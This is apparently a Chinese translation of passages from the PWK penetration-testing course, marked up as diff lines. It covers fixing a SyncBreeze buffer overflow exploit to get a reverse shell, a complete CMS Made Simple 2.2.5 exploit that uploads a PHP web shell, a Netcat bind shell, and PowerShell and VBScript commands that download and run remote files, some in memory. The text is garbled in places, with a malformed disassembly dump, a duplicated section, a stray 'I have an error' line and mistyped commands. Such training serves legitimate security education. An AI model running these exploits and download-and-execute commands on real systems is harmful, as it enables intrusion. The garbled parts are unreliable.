+00401117: 8B   DWORD PTR [ESI:ESP+21]
+
+0040111A: 89   DWORD PTR [ESI:ESP],EAX
+
+0040111D: 90   NOP
+
+0040111E: 90   NOP
+
+0040111F: 90   NOP
+
+00401120: 90   NOP
+
+00401121: 90   NOP
+
+00401122: 90   NOP
+
+00401123: 90   NOP
+
+00401124: 90   NOP
+
+00401125: 90   NOP
+
+00401126: 90   NOP
+
+00401127: 90   NOP
+
+00401128: 90   NOP
+
+00401129: 90   NOP
+
+0040112A: 90   NOP
+
+0040112B: 90   NOP
+
+0040112C: 90   NOP
+
+0040112D: 90   NOP
+
+0040112E: 90   NOP
+
+0040112F: 90   NOP
+
+00401130: 53   PUSH EBX
+
+00401131: 51   PUSH ESI
+
+00401132: 55   PUSH EBP
+
+00401133: 8B   MOV EAX,0000BC
+
+00401134: 8B   DWORD PTR [ESI:ESP+24]
+
+00401137: 8B   DWORD PTR [ESI:ESP+21]
+
+0040113A: 89   MOV DWORD PTR [ESI:ESP],EAX
+
+0040113D: 90   NOP
+
+0040113E: 90   NOP
+
+0040113F: 90   NOP
+
+00401140: 90   NOP
+
+00401141: 90   NOP
+
+00401142: 90   NOP
+
+00401143: 90   NOP
+
+00401144: 90   NOP
+
+00401145: 90   NOP
+
+00401146: 90   NOP
+
+00401147: 90   NOP
+
+00401148: 90   NOP
+
+00401149: 90   NOP
+
+0040114A: 90   NOP
+
+0040114B: 90   NOP
+
+0040114C: 90   NOP
+
+0040114D: 90   NOP
+
+0040114E: 90   NOP
+
+0040114F: 90   NOP
+```
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+令人惊讶的是，我们完全没有命中断点。相反，应用程序崩溃了，EIP 寄存器似乎被 `0x901090c` 覆盖。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_465_0.png)
+
+图 22：EIP 被我们错位了一个字节的返回指令地址所覆盖
+
+通过分析存储在 EIP 中的值 (`0x901090c0`) 和设置目标应用程序的缓冲区，我们注意到，我们到栈上返回地址的偏移量似乎偏移了一个字节。错误的偏移量强制 CPU 从栈中弹出（POP）一个不同的返回地址，而不是预期的 `0x10090c83`。
+
+## 15.1.6.1 练习
+
+- 1. 使用 `msvenom` 在考虑漏洞利用坏字符（bad characters）的情况下生成反向 shell 载负载（payload）。
+- 2. 用新生成的 payload 替换原始 payload。
+- 3. 将调试器附加到目标进程，并在返回地址指令处设置断点。
+- 4. 编译漏洞并运行它。你命中断点了吗？
+
+## 修改溢出缓冲区
+
+让我们尝试理解这种错位。通过查看我们第一部分 "A" 大填充缓冲区被创建的地方，我们注意到它始于一个大小为 780 的 `malloc` 调用：
+
+```
+int initial_buffer_size = 780;
+
+char *padding = malloc(initial_buffer_size);
+```
+
+> 列表 440 - 使用 `malloc` 为初始缓冲区分配内存
+
+这个数字对你来说应该很熟悉。如果你还记得，在我们在 Windows 缓冲区溢出模块期间的研究中，我们注意到 780 是覆盖栈上返回地址并控制 EIP 寄存器的字节偏移量。
+
+`malloc` 函数仅按请求的大小分配内存块。此缓冲区需要被妥善初始化，这是在调用 `malloc` 之后使用 `memset` 函数完成的：
+
+```
+memset(padding, 0x41, initial_buffer_size);
+```
+
+> 列表 441 - 用 "A" 字符填充缓冲区
+
+使用 `memset` 会用特定字符填充内存分配，在我们的案例中是 `0x41`，即 ASCII 中 "A" 字符的十六进制表示。
+
+漏洞中的下一行代码很有趣。有一个 `malloc` 的调用，它将分配的最后一个字节设置为 NULL（零）：
+
+```
+memset(padding + initial_buffer_size - 1, 0x00, 1);
+```
+
+> 列表 442 - 将最后一个字节设置为空终止符以将缓冲区转换为字符串
+
+起初这可能令人困惑，但继续阅读代码，我们到达了创建最终缓冲区的行：
+
+```
+char *buffer = malloc(buffer_length);
+
+memset(buffer, 0x00, buffer_length);
+
+strcpy(buffer, request_name);
+
+strcat(buffer, content_length_string);
+
+strcat(buffer, padding);
+
+strcat(buffer, retn);
+
+strcat(buffer, shellcode);
+
+strcat(buffer, request_three);
+```
+
+> 列表 443 - 为漏洞创建缓冲区
+
+代码首先为缓冲区字符数组分配内存块，并用空字节填充数组。接下来，代码通过各种字符串处理函数（如 `strcpy` 和 `strcat`）复制其他变量的内容来填充缓冲区数组。
+
+## 攻击性
+
+将填充后的缓冲区构建为字符串是非常重要的信息。C 语言语言使用空终止字符串。
+
+我们可以通过将 `initial_buffer_size` 变量定义的请求内存大小增加 1 来快速修复此。
+
+```
+int initial_buffer_size = 781;
+
+char *padding = malloc(initial_buffer_size);
+
+memset(padding, 0x41, initial_buffer_size);
+
+memset(padding + initial_buffer_size - 1, 0x00, 1);
+```
+
+作为最后的测试，我们将编译代码，在端口 443 上设置 Netcat 监听器来捕获反向 shell，并让它运行；
+
+```
+kali@kali:~/Desktop$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+
+kali@kali:~/Desktop$ sudo nc -lvp 443
+
+listening on [any] 443 ...
+```
+
+接下来，我们将运行漏洞
+
+```
+kali@kali:~/Desktop wine syncbreeze_exploit.exe
+
+[]> Initialising Winsock...
+
+[]> Initialised.
+
+[]> Socket created.
+
+[]> Connected
+```
+
+[]> Request sent
+
+最后切换到我们的 netcat 监听器：
+
+```
+listening on [any] 443 ...nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 49662
+
+Microsoft Windows [Version 10.0.10240]
+
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+
+
+太棒了！我们得到了 shell。
+
+等等，我有一个错误。需要查看流程。
+
+图 22：EIP 被我们错位了一个字节的返回指令地址所覆盖
+
+## 攻击性
+
+将填充后的缓冲区构建为字符串是非常重要的信息。C 语言语言使用空终止字符串
+
+我们可以通过将 `initial_buffer_size` 变量定义的请求内存大小增加 1 来快速修复此。
+
+```
+int initial_buffer_size = 781;
+
+char *padding = malloc(initial_buffer_size);
+
+memset(padding, 0x41, initial_buffer_size);
+
+memset(padding + initial_buffer_size - 1, 0x00, 1);
+```
+
+作为最后的测试，我们将编译代码，在端口 443 上设置 Netcat 监听器来捕获反向 shell，并让它运行；
+
+```
+kali@kali:~/Desktop$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+
+kali@kali:~/Desktop$ sudo nc -lvp 443
+
+listening on [any] 443 ...
+```
+
+接下来，我们将运行漏洞
+
+```
+kali@kali:~/Desktop wine syncbreeze_exploit.exe
+
+[]> Initialising Winsock...
+
+[]> Initialised.
+
+[]> Socket created.
+
+[]> Connected
+```
+
+[]> Request sent
+
+最后切换到我们的 netcat 监听器：
+
+```
+listening on [any] 443 ...nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 49662
+
+Microsoft Windows [Version 10.0.10240]
+
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+太棒了！我们得到了 shell。
+
+
+
+> 列表 453 - 更新以匹配我们场景的 `username` 和 `password` 变量
+
+注意，在这种情况下，我们不需要更新简单的负载，因为它只执行通过 GET 请求传递的命令。
+
+在完成所有编辑后，最终的利用程序应该所示：
+
+```python
+# Exploit Title: CMS Made Simple 2.2.5 authenticated Code Execution
+
+# Date: 3rd of July, 2018
+
+# Exploit Author: Mustafa Hasan (@strukt93)
+
+# Vendor Homepage: http://www.cmsmadesimple.org/
+
+# Software Link: http://www.cmsmadesimple.org/downloads/cmsms/
+
+# Version: 2.2.5
+
+# CVE: CVE-2018-1000994
+
+import requests
+
+import base64
+
+base_url = "https://10.11.0.128/admin"
+
+upload_dir = "/uploads"
+
+upload_url = base_url.split('/admin')[0] + upload_dir
+
+username = "admin"
+
+password = "HUYfaw763"
+
+csrf_form = "__c"
+
+txt_filename = "_cmmsrce.txt"
+
+php_filename = "_shell.php"
+
+payload = "<?php system(\$_GET['cmd']);?>"
+
+def parse_csrf_token(location, csrf_param):
+    return location.split(csrf_param + "=")[1]
+
+def authenticate():
+    page = "/login.php"
+    url = base_url + page
+    data = {
+        "username": username,
+        "password": password,
+        "loginsubmit": "Submit"
+    }
+    response = requests.post(url, data=data, allow_redirects=False, verify=False)
+    if response.status_code == 302:
+        print("[+] Authenticated successfully with the supplied credentials")
+        return response.cookies, parse_csrf_token(response.headers['Location'], csrf_form)
+    print("[-] Authentication failed")
+    return None, None
+
+def upload_txt(cookies, csrf_token, csrf_param):
+    mact = "FileManager,m1,_upload,0"
+    page = "/moduleinterface.php"
+    url = base_url + page
+    data = {
+        'mact': mact,
+        'csrf_param': csrf_token,
+        'disable_buffer': 1
+    }
+    txt = {
+        '_mil_files[1]': (txt_filename, payload)
+    }
+    print("[+] Attempting to upload {}".format(txt_filename))
+    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
+    status_code = response.status_code
+    if status_code == 200:
+        print("[+] Successfully uploaded {}".format(txt_filename))
+        return True
+    print("[-] An error occurred while uploading {}".format(txt_filename))
+    return None
+
+def copy_to_php(cookies, csrf_token, csrf_param):
+    mact = "FileManager,m1,_file,0"
+    page = "/moduleinterface.php"
+    url = base_url + page
+    b64 = base64.b64encode(txt_filename)
+    serialized = {'all':{0:"{1:"{}"}}'.format(len(b64), b64)}
+    data = {
+        'mact': mact,
+        'csrf_param': csrf_token,
+        '_ml_fileactioncopy': "",
+        '_ml_path': upload_dir,
+        '_ml_selall': serialized,
+        '_ml_destdir': "/",
+        '_ml_destname': php_filename,
+        '_ml_submit': "Copy"
+    }
+    print("[+] Attempting to copy to {}".format(txt_filename, php_filename))
+    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
+    status_code = response.status_code
+    if status_code == 302:
+        if response.headers['Location'].endswith('copysuccess'):
+            print("[+] File copied successfully")
+            return True
+    print("[-] An error occurred while copying, maybe {} already exists".format(php_filename))
+    return None
+
+def quit():
+    print("[-] Exploit failed")
+    exit()
+
+def run():
+    cookies, csrf_token = authenticate()
+    if not cookies:
+        quit()
+    if not upload_txt(cookies, csrf_token, csrf_form):
+        quit()
+    if not copy_to_php(cookies, csrf_token, csrf_form):
+        quit()
+    print("[✓] Exploit succeeded, shell found at {}".format(upload_url + php_filename))
+```
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+`InsecureRequestWarning`
+
+```
+[+] 使用提供的凭据身份验证成功
++] 正在拆分的字符串
+https://10.11.0.128/admin/?sk=f2946ad9afcecb247864
+Traceback (most recent call last):
+  File "4496_modified.py", line 104, in <module>
+    run()
+  File "4496_modified.py", line 95, in run
+    cookies,csrf_token = authenticate()
+  File "4496_modified.py", line 39, in authenticate
+    return response.cookies.parse(csrf_token,response.headers['Location'])
+```
+
+
+
+`File "4496_modified.py", line 25, in csrf_token`
+
+```
+return location.split(csrf_param + "=")[[1]
+```
+
+`IndexError: list out of range`
+
+列表 459-检查打印输出并注意到 `csrf_param` 变量中缺少该字符串
+
+虽然代码期望输入包含如列表 458 所示的 `_csrf`（由 `csrf_param` 变量定义），但我们从 Web 应用程序接收到了 `_sk`。
+
+此时，我们并不完全理解为什么发生这种情况。也许漏洞开发者的软件与我们的之间存在不匹配，或者是 CMS 配置不匹配。无论如何，漏洞开发从未是一帆风顺。
+
+尽管如此，我们可以尝试将 `csrf_param` 变量从 `_c` 更改为 `_sk`，以匹配 CMS 的响应并查看其是否有效：
+
+```
+csrf_param = "_sk"
+
+file_filename = 'cmsrscre.txt'
+
+php_filename = 'shell.php'
+
+payload = "<?php system(\$_GET['id']);\?>"
+```
+
+列表 460-更改 `csrf_param` 变量
+
+现在让我们执行修改后的漏洞：
+
+```
+kali@kali: $ python 4495_modified.py
+
+/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:848: InsecureRequestWarning
+
+: 正在发出未验证的 HTTP 请求。强烈建议添加证书验证。详见：https://urllib3.readthedocs.io/en/latest/advanced-guide.html#ssl-warnings
+```
+
+```
+[+] 使用提供的凭据身份验证成功
+
++] 正在拆分的字符串: https://10.11.0.128/admin/?sk=bdc51a781fe6edcc126
+
++] 正在上传 cmsrscre.txt...
+```
+
+```
+[+] 成功上传 cmsrscre.txt
+
++] 正在将 cmsrscre.txt 复制到 shell.php...
+```
+
+```
+[+] 文件复制成功
+
++] 漏洞利用成功，可以在此处找到 shell：http://10.11.0.128/uploads/shell.php
+```
+
+列表 461- 成功的漏洞利用输出
+
+错误不再显示，我们收到了一条消息，告知漏洞利用已成功。尽管我们并不清楚为什么需要将 `csrf_param` 变量从 `_c` 更改为 `_sk_`。
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. All rights reserved.
+
+# OFFENSIVE SECURITY
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+从 `_c` 更改为 `_sk_` 提供了一个适应意外情况的绝佳机会，这是优秀渗透测试人员非常擅长的能力。
+
+现在，我们可以通过使用 `curl` 等工具连接到 php shell 并提供系统命令作为负载来验证漏洞的有效性：
+
+```
+kal@kali:~ curl -k https://10.11.0.128/uploads/shell.php?cmd=whoami
+```
+
+列表 462 - 通过尝试使用上传的 php shell 执行 `whoami` 来验证我们的漏洞是否成功。
+
+很好。漏洞利用成功了。我们获得了一个 Web shell。
+
+# 15.2.4.1 练习题
+
+- 观察运行漏洞时生成的错误。
+- 尝试对代码进行调试，并确定错误发生的原因。
+- 修改漏洞以避免错误，并针对你的专用 Linux 客户端运行它。
+- 通过尝试使用远程 php shell 执行 `whoami` 命令来验证你的漏洞是否有效。
+- 尝试使用此漏洞获取一个完全交互式的 shell。
+
+### 15.3 总结
+
+在本模块中，我们涵盖了普通堆栈缓冲区溢出的主要部分，这需要大量的编辑以匹配我们的目标环境。我们对代码进行了交叉编译，以便其在我们的 Kali 攻击平台上运行。
+
+我们还修改了一个 Web 漏洞，以演示此类漏洞如何被重新用于不同的目标环境。
+
+这些场景揭示了在执行任务过程中处理公共漏洞时遇到常见障碍的解决方案。
+
+# 16. 文件传输
+
+“后渗透”（post-exploitation）术语是指攻击者在获得目标某种程度的控制权后执行的操作。后渗透行动可能包括提升权限、将控制权扩展到其他机器、安装后门、清理攻击证据、向目标机器上传文件和工具等。
+
+在本模块中，我们将探索各种文件传输方法，这些方法在特定条件下被妥善使用时可以协助我们的评估。
+
+# 16.1 注意事项与准备
+
+我们在本模块中讨论的文件传输方法可能会危及任务的成功，我们应该谨慎使用，并仅在特定条件下使用。我们将在本节中讨论这些条件。
+
+我们还将讨论一些基础准备工作，以促进练习演示并克服障碍。
+
+## 16.1.1 传输工具的危险
+
+在某些情况下，我们可能需要向目标传输工具。然而，传输工具可能是危险的，原因如下：
+
+首先，工具可能会被恶意实体滥用，这给资源带来风险。在评估完成后记录并删除它们。
+
+其次，杀毒软件扫描文件会成为巨大的问题。如果系统管理员很尽职，他们会在执行期间发现工具。
+
+## 16.1.2 安装 Pure-FTPd
+
+为了让客户端连接到我们的服务器，我们需要创建一个用户。如果你已经配置了服务器，可以跳过这些步骤。
+
+```
+kali@kali:~ sudo apt update && sudo apt install pure-fd
+```
+
+以下 Bash 脚本将自动化 Pure-FTPd 的用户创建：
+
+```bash
+kali@kali:~ cat .setup-ftp.sh
+
+#!/bin/bash
+
+groupadd ftroup
+
+useradd -g ftroup -d /dev/null -s ftpuser
+
+pure-pw user offsec -d /ftphome
+
+pure-pw mkdb
+
+mkdir -p /ftphome
+
+chown -R ftpuser:ftroup /ftphome
+```
+
+我们将脚本设置为可执行，运行它并在提示时为 offsec 输入密码“lab”：
+
+```
+kali@kali:~ chmod +x setup-ftp.sh
+
+kali@kali:~ sudo ./setup-ftp.sh
+
+Password:
+
+Enter it again: lab
+
+Restarting ftp server
+```
+
+## 16.1.3 非交互式 Shell
+
+大多数类似 Netcat 的工具提供非交互式 shell，这意味着需要用户输入的程序（如许多文件传输或 sudo）效果糟糕，甚至无法运行。非交互式 shell 还提供选项卡补全和作业控制等有用功能。一个示例将说明这个问题。
+
+你熟悉 `ls` 命令。该命令是非交互式的，因为不需要用户交互即可完成。
+
+相反，考虑从我们的 Debian 实验室连接到 Kali 系统的典型 ftp 登录话：
+
+```
+student@debian:~ ftp 10.11.0.4
+
+Connected to 10.11.0.4.
+
+220-
+
+Welcome to Pure-FTPd [privsep] [TLS]
+
+220-你是允许的 50 个用户中的第一个。
+
+220-本地时间为 09:07。服务器端口：21。
+
+220-这是一个私有系统 - 禁止匿名登录
+
+220-此服务器也欢迎 IPv6 连接。
+
+220-在活动 15 分钟后将断开连接。
+
+Name (10.11.0.4:student): offsec
+
+331 User offsec OK. 需要密码
+
+Password: lab
+
+230 OK. 当前目录为 /
+
+使用二进制模式传输文件。
+
+ftp bye
+
+221-Goodbye. 你上传了 0 字节，下载了 0 k字节。
+```
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+![](img/f99f528ca9845f4c256ce54e882b1345_478_0.png)
+
+221 Logout.
+student@debian:~# $
+
+> 列表 466 - FTP 服务器交互
+
+在此会话中，我们输入用户名和密码，只有在输入 `bye` 命令后进程才会退出。这是一个交互式程序；它需要用户干预才能完成。
+
+尽管在此时问题可能显而易见，但让我们尝试通过非交互式 shell（在此例中为 Netcat）建立一个 FTP 会话。
+首先，假设我们有一个 Debian 客户端并获取了 Netcat shell 的访问权限。我们将在端口 4444 上启动 Debian 客户端来模拟这一点：
+
+```
+student@debian:~# nc -lvnp 4444 -e /bin/bash
+
+listening on [any] 4444 ...
+```
+
+
+
+> 列表 467 - 配置 Netcat 绑定 shell (bind shell)
+
+从我们的 Kali shell 开始，连接到网络并尝试执行列表 466 中的 FTP 会话：
+
+```
+kali@kali:-$ nc -vn 10.11.0.128 4444
+
+ftp 10.11.0.4
+
+offsec
+
+lab
+
+bye
+
+^C kali@kali:-$ 
+```
+
+> 列表 468 - 在非交互式 shell 中尝试 FTP 连接
+
+在后台，我们正在与 FTP 服务器进行交互，但在我们的 shell 中没有接收到任何反馈。这是因为 FTP 会话（一个交互式程序）的标准输出在基本的绑定 shell 或反向 shell (`reverse shell`) 中没有被重定向。这导致我们失去了对 shell 的控制，并且被迫完全使用 `Ctrl+C` 退出。这在评估过程中可能是一个非常棘手的问题。
+
+### 16.1.3.1 升级非交互式 shell
+
+现在我们已经了解了非交互式 shell 的一些局限性，让我们看看如何“升级”我们的 shell 以使其更加有用。Linux 系统上经常安装的 Python 解释器有一个标准模块 `pty`，它允许创建伪终端。通过使用该模块，我们可以从远程 shell 中派生一个独立的进程并获得一个完全交互式的 shell。让我们尝试一下：
+
+我们重新连接到 Netcat shell，并派生 python shell：
+
+```
+kali@kali:-$ nc -vn 10.11.0.128 4444
+
+(UNKNOWN) [10.11.0.128] 4444 ()) open
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+student@debian:~$ 
+```
+
+> 列表 469 - 使用 Python 升级你的 shell
+
+运行 Python 命令后，我们立即会看到一个 bash 提示符。让我们尝试再次连接到本地 FTP 服务器，这次通过 py shell，并观察它的表现：
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. All rights reserved.
+
+```
+student@debian:~$ ftp 10.11.0.4
+
+ftp 10.11.0.4
+
+Connected to 10.11.0.4.
+
+-------------------- Welcome to Pure-FTPD [privsep] [TLS]
+
+220-You are user 1 of 50 allowed.
+
+220-Local time is now 09:16. Server port: 21.
+
+220-This is a private system No anonymous login
+
+220-IPv6 connections are also welcome on this server.
+
+220-You will be disconnected after 15 minutes of inactivity.
+
+Name (10.11.0.4:student): offsec
+
+offsec
+
+331 User offsec OK. Password required
+
+Password:offsec
+
+230 OK. Current directory is /
+
+Remote system type is UNIX.
+
+Using binary mode to transfer files.
+
+ftp> bye
+
+bye
+
+221-Goodbye. You uploaded 0 and downloaded 0 bytes.
+
+221 Logout.
+
+student@debian:-$ 
+```
+
+> 列表 470 - 使用升级后的 shell 使用交互式程序
+
+这一次，我们与 FTP 服务器的连接成功了，当我们退出时，我们返回了交互式提示符。这种技术有效地通过传统的非交互式通道提供了一个交互式 shell，并且是 Linux 上标准非交互式 shell 最流行的升级方法之一。
+
+### 16.1.3.2 练习
+
+（这些练习不需要报告）
+
+- 1. 在你的 Kali 系统上启动 Pure-FTPD 服务，使用 Debian 实验虚拟机上的 FTP 客户端连接它，并观察交互式提示符是如何工作的
+- 2. 尝试从 Netcat 反向 shell 登录 FTP 服务器，看看会发生什么。
+- 3. 研究升级非交互式 shell 的替代方法。
+
+# 16.2 在 Windows 节点上传输文件
+
+在 Unix 类系统中，我们会发现 `Netcat`、`curl` 或 `wget` 等工具已预装，这使得从远程机器下载文件相对简单。然而，在 Windows 机器上，过程通常并不那么直接。在本节中，我们将探索基于 Windows 节点的传输选项。
+
+## 16.2.1 非交互式 FTP 下载
+
+Windows 操作系统带有默认 FTP 客户端，可以用于文件传输。正如我们所看到的，FTP 客户端是一个交互式程序，需要输入才能完成，因此在使用 FTP 进行文件传输时我们需要一种创意的解决方案。
+
+`ftp` 选项 (`-h`) 有一些可能对我们帮助的线索：
+
+```
+C:\Users\offsec> ftp -h
+
+Transfers files and from a computer running an FTP service
+
+(sometimes called a daemon). FTP can be used interactively.
+
+FTP [-v] [-d] [-i] [-n] [-g] [-filename] [-a] [-A] [-x:sendbuffer] [-r:recvbuffer] [
+
+-b:asyncbuffer] [-w:windowsize]
+
+```
+
+- `-v` Suppresses display of remote server responses.
+- `-i` Turns off auto-login upon initial connection.
+- `-d` Enables debugging (see GLOB command).
+- `-g:filename` Specifies a text file containing FTP commands; the commands will all automatically run after FTP starts.
+- `-a` Use any local interface when binding data connection.
+- `-x:sendbuffer` Overrides the default SONDBUF size of 8192.
+- `-r:recvbuffer` Overrides the default SO_RCBUF size of 8192.
+- `-b:asyncbuffer` Overrides the default count of 3.
+- `-w:windowsize` Overrides the default size of 65535.
+- `-host` Specifies the host or IP address.
+- `-f` Use the name of the command file.
+- `-y/n` for yes/no.
+- `-q` for quit.
+
+# OFFENSIVE SECURITY
+www.offensive-security.com
+
+Penetration Testing with Kali Linux 2.0
+
+我们可以利用脚本引擎如 VBScript397（适用于 Windows, XP, 2003）和 PowerShell（适用于 Windows 7, 2008 及以上版本）将文件下载到我们的受害者机器。例如，以下
+
+> 397 (Wikipedia, 2019), https://en.wikipedia.org/wiki/VBScript
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+当将 OFFENSIVE 交互式命令粘贴到远程 shell 时，它将写出一个 `wget.vbs` 脚本，该脚本作为一个简单的 HTTP 下载器：
+
+列表 477 - 创建一个 VBScript HTTP 下载器
+
+我们可以运行 `(cscript wget.vbs)` 从我们的 Kali 机器下载文件：
+
+```
+C:\Users\Offsec cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
+```
+
+
+
+# 列表 478 - 执行 VBScript HTTP 下载器
+
+对于大多数最新版本的 Windows，您可以使用 PowerShell 作为一种更简单的下载替代方案。下面的示例展示了使用 `System.Net.WebClient` PowerShell 类实现的下载器：398。
+
+>> 398 (Microsoft, 2019), https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?redirectedfrom=msdn&view=netframework-4.8
+
+```
+C:\Users\Offsec> echo webclient = New-Object System.Net.Client >>wget.ps1
+
+C:\Users\Offsec> echo url = "http://10.11.0.4/evil.exe" >>wget.ps1
+
+C:\Users\Offsec> echo file = "new-exploit.exe" >>wget.ps1
+
+C:\Users\Offsec> echo webclient.DownloadFile($url,$file) >>wget.ps1
+```
+
+# 列表 479 - 创建一个 PowerShell HTTP 下载器
+
+现在我们可以使用 PowerShell 运行脚本并下载文件。然而，为了确保执行的正确性且隐蔽性，我们在执行脚本时指定了若干选项，如下列表 480 所示。
+
+首先，我们必须执行 PowerShell 脚本（默认是被限制的）。接下来，我们将使用 `-NoLogo` 和 `-NonInteractive` 分别隐藏 PowerShell 横幅并支持交互式 PowerShell 提示符。`-Profile` 关键字将防止 PowerShell 加载默认配置文件（这是必要的），最后我们将使用 `-File` 指定脚本：
+
+```
+C:\Users\Offsec> powershell.exe -Execution Bypass -Nologo -NonInteractive -NoProfile-File wget.ps1
+```
+
+# 列表 480 - 执行 PowerShell HTTP 下载器
+
+我们也可以像下面这样作为单行执行：
+
+```
+C:\Users\Offsec> powershell.exe (New-Object System.Net.Client).DownloadFile('http://10.11.0.4/evil.exe','new-exploit.exe')
+```
+
+# 列表 481 - 以单行执行 PowerShell HTTP 下载器
+
+如果我们想在不保存到磁盘的情况下下载并执行 PowerShell 脚本，我们可以再次使用 `System.Net.Webclient` 类。这是通过使用 `Invoke-Expression` 命令 (`IEX`)^{399} 创建 `DownloadString` 方法来实现的。
+
+为了演示这一点，我们将在 Kali 机器上创建一个简单的 PowerShell 脚本（列表 482）：
+
+```
+kali@kali:/var/www/html5 sudo chmod helloworld.ps1
+
+Write-Output "Hello World"
+```
+
+# 列表 482 - 托管在我们的 Web 服务器上的 Hello World 脚本
+
+接下来，我们将在 Windows 机器上使用以下命令运行脚本（列表 483）：
+
+```
+C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.Client).DownloadString('http://10.11.0.4/helloworld.ps1')
+
+Hello World
+```
+
+# 列表 483 - 直接从内存执行 PowerShell 脚本
+
+PowerShell 脚本的内容已从我们的 Kali 机器下载并成功执行，未保存到受害者的硬盘上。
+
+> 399 (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6
+
+## 16.2.3 使用 exe2hex 和 PowerShell 下载 Windows 文件
+
+在本节中，我们将采取一种虽然迂回但非常有趣的路线，将二进制文件从 Kali 下载到压缩后的 Windows 宿主机。从 Kali 机器开始，我们将压缩想要传输的二进制文件，将其转换为十六进制字符串，并嵌入 Windows 脚本中。
+
+在 Windows 机器上，我们将此脚本粘贴到我们的环境中并运行。它会将十六进制数据重定向到 `powershell.exe`，将其组装成二进制文件。这将通过一系列交互交互命令完成。
+
+例如，让我们使用 `powershell.exe` 通过远程 shell 从我们的 Kali Linux 机器将 Netcat 传输到我们的 Windows 客户端。
+
+我们首先在 Kali Linux 中找到并检查 `nc.exe` 文件。
+
+```
+kali@kali:-$ locate nc.exe | grep binaries
+
+/usr/share/windows-resources/binaries/nc.exe
+
+kali@kali:-$ cp /usr/share/windows-resources/binaries/nc.exe
+
+kali@kali:-$ ls -lh nc.exe
+
+-rwxrxr-x 1 kali kali 50K Sep 18 14:22 nc.exe
+```
+
+尽管二进制文件已经很小了，但我们将减小文件大小以展示如何操作。我们将使用 `upx`，这是一个可执行文件压缩器（也称为 PE 压缩）：
+
+```
+kali@kali:-$ upx -9 nc.exe
+
+Ultimate Packer for Executables
+
+Copyright (C) 1996 - 2018
+
+UPX 3.95 Markus Oberfer, Las Molnar and John Reiser Aug 26 2018
+```
+
+| 文件大小 | 比例 | 名称 |
+| :--- | :--- | :--- |
+| 59328 | 50.0% | win32/nc.exe |
+
+```
+kali@kali:-$ ls -lh nc.exe
+
+-rwxrxr-x 1 kali kali 50K Sep 18 14:22
+```
+
+我们可以看到，我们优化了 `nc.exe` 的文件大小，将其减小了近 50%。尽管尺寸更小，PE 文件仍然可以工作并能够正常运行。现在它已经优化并准备好传输，我们可以将 `nc.exe` 转换为 Windows 脚本 (`.cmd`) 以在 Windows 机器上运行，这会将文件转换为十六进制并插入 `powershell.exe` 将其重新组装为二进制文件。我们将使用优秀的 `exe2hex` 工具处理此过程：
+
+```
+kali@kali:-$ exe2hex -x nc.exe -p nc.cmd
+
+[*] exe2hex v1.5.1
+
++] Successfully wrote nc.cmd
+```
+
+这会创建一个内容如下的 `script.cmd` 脚本：
+
+```
+echo /p="nc"
+
+echo /p="d4a9a000300000000000000f77ef00b8000000000e1fbae0b409c2d21b014cc232514686932720726772612d206316e7426026522752262944f53206d6f45c209d00a2400000000000
+
+echo /p="504500004c0130b8b9eae3400000000000000000000000f1b0105007000000100000704c0101
+```
+
+
+
+## 16.2.5 使用 TFTP 上传文件
+
+虽然上述基于 Windows 的文件传输方法适用于自 Windows 7 和 Windows Server 2008 R2 以来的所有 Windows 版本，但在遇到旧版本的操作系统时，可能会遇到问题。PowerShell 虽然非常强大且经常使用，但在 Windows XP 和 Windows Server 2003 等操作系统上默认并未安装，这些系统在某些生产网络中仍然可见。VBScript 和 FTP 客户端都存在且可以工作，在本节中，我们将讨论另一种在实环境中可能有效的文件传输方法。
+
+TFTP⁴⁰⁰ 是一种基于 UDP 的文件传输协议，通常受到企业出口防火墙规则的限制。
+
+在渗透测试中，我们可以使用 TFTP 从旧版操作系统（如 Windows XP 和 2003）传输文件。对于非交互式文件传输，这是一个非常棒的工具，但在运行 Windows 7、2008 及更高版本的系统上默认并未安装。
+
+由于这些原因，TFTP 不是适用于所有情况的理想文件传输协议，但在特定情况下，它有自己的优势。
+
+在学习如何使用 TFTP 传输文件之前，我们首先需要在 Kali 中安装并配置 TFTP 服务器，并创建用于存储和保存文件的目录。接下来，我们将更新目录的所有权，以便向其中写入文件。我们将作为守护进程在 udp 端口 69 上运行 atpd，并将其指向新创建的 `/tftp` 目录：
+
+```
+kali@kali~$ sudo apt update && sudo apt install atftp
+
+kali@kali~$ sudo mkdir /tftp
+
+kali@kali~$ sudo own nobody:nobody
+
+kali@kali~$ sudo ftpd --port 69 /tftp
+```
+
+在 Windows 系统上，我们将带有 `-i` 参数运行 `tfftp` 客户端以创建一个二进制镜像传输，指定 Kali 系统的 IP 地址，使用 `put` 命令启动上传，并指定要上传的文件名。
+
+最终命令如下方列表 495 所示：
+
+```
+C:\Users\Offsec$ tfftp -i 10.11.0.4 put important.docx
+
+Transfer successful: 39258 bytes in 96 second(s), 3712 bytes/s
+```
+
+关于使用 Windows 工具进行文件操作、程序执行、UAC 绕过等许多其他非常有趣的方法，例如由 Oddvar Moe 和几位贡献者维护的利用二进制文件和脚本（LOLBAS）项目⁴⁰¹，该项目旨在“记录”每个可以用于[这些]技术的二进制文件、脚本和库。*例如，`certutil.exe`⁴⁴⁰² 程序可以轻松下载任意文件等更多内容。
+
